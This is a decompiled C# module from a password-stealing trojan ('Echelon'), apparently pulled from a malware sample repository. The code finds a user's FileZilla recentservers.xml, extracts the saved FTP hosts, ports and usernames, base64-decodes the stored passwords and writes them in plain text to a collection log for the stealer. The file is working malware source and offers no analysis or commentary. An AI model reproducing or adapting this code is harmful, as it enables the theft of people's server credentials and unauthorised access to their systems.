// Decompiled with JetBrains decompiler
// Type: Echelon.FileZilla
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon
{
  internal class FileZilla
  {
    public static int count = 0;
    private static StringBuilder SB = new StringBuilder();
    public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");

    public static void Start(string Echelon_Dir)
    {
      if (!File.Exists(FileZilla.FzPath))
        return;
      Directory.CreateDirectory(Echelon_Dir + "\\FileZilla");
      FileZilla.GetDataFileZilla(FileZilla.FzPath, Echelon_Dir + "\\FileZilla\\FileZilla.log");
    }

    public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
    {
      try
      {
        if (!File.Exists(PathFZ))
          return;
        try
        {
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.Load(PathFZ);
          foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
          {
            string innerText1 = xmlElement.GetElementsByTagName("Host")[0].InnerText;
            string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
            string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
            string str = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
            if (!string.IsNullOrEmpty(innerText1))
            {
              if (!string.IsNullOrEmpty(innerText2))
              {
                if (!string.IsNullOrEmpty(innerText3))
                {
                  if (!string.IsNullOrEmpty(str))
                  {
                    FileZilla.SB.AppendLine("Host: " + innerText1);
                    FileZilla.SB.AppendLine("Port: " + innerText2);
                    FileZilla.SB.AppendLine("User: " + innerText3);
                    FileZilla.SB.AppendLine("Pass: " + str + "\r\n");
                    ++FileZilla.count;
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              break;
          }
          if (FileZilla.SB.Length <= 0)
            return;
          try
          {
            File.AppendAllText(SaveFile, FileZilla.SB.ToString());
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
